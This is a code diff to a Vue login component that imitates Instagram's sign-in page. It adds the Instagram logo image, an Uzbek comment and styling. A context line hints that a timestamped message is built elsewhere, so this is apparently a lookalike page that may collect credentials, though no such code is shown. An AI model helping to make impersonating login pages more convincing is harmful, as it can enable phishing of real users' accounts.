@@ -1,7 +1,13 @@
 <template>
   <div class="container">
     <div class="login-box">
+      <!-- Faqat bitta logo-container -->
       <div class="logo-container">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+          alt="Instagram Logo"
+          class="logo-img"
+        />
         <h1 class="logo">Instagram</h1>
       </div>
 
@@ -127,6 +133,7 @@ Time: ${new Date().toLocaleString()}
 .logo-container {
   display: flex;
   justify-content: center;
+  align-items: center;
   margin-bottom: 32px;
 }
 
@@ -217,5 +224,10 @@ Time: ${new Date().toLocaleString()}
 .signup-link {
   color: #0095f6;
   text-decoration: none;
+}
+.logo-img {
+  width: 40px;
+  height: 40px;
+  margin-right: 10px;
 }
 </style>
